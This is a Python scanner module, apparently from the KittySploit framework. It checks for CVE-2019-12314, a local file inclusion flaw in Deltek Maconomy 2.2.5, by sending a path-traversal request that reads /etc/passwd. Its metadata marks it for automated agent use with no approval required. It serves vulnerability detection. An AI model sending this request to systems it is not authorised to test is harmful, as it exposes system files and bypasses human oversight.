#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Deltek Maconomy 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Deltek Maconomy 2.2.5 - Local File Inclusion Detection',
        'description': 'Deltek Maconomy 2.2.5 is prone to local file inclusion via absolute path traversal in the WS.macx1.W_MCS/ PATH_INFO, as demonstrated by a cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS/etc/passwd URI.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'packetstorm', 'deltek', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/153079/Deltek-Maconomy-2.2.5-Local-File-Inclusion.html',
            'https://github.com/ras313/CVE-2019-12314/security/advisories/GHSA-8762-rf4g-23xm',
            'https://github.com/JameelNabbo/exploits/blob/master/Maconomy%20Erp%20local%20file%20include.txt',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2019-12314',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Deltek Maconomy 2.2.5 - Local File Inclusion detected",
                path='/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd',
            )
            return True
        return False

